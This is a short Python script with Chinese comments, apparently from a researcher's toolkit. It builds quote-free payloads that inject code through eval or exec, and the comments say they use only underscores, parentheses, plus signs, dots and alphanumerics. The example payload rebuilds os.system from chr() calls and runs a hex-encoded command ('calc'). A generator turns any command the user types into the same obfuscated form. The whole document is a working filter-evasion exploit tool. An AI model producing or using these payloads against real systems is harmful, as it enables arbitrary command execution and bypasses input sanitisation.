#by leeya_bug

#无引号版只包含 _ , ( , ) , + , . , a-z , A-Z , 0-9 这几种字符
#适用于eval、exec等函数

#Payload: 
if False:
    __import__(chr(111)+chr(115)).system(__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)).b16decode(hex(int(repr(0x63616C63))).upper().strip(chr(48)+chr(88))).decode())

#Payload生成
import base64

cmd = input('请输入命令: ')
a = base64.b16encode(cmd.encode()).decode()
print(f'''__import__(chr(111)+chr(115)).system(__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)).b16decode(hex(int(repr(0x{a}))).upper().strip(chr(48)+chr(88))).decode())''')
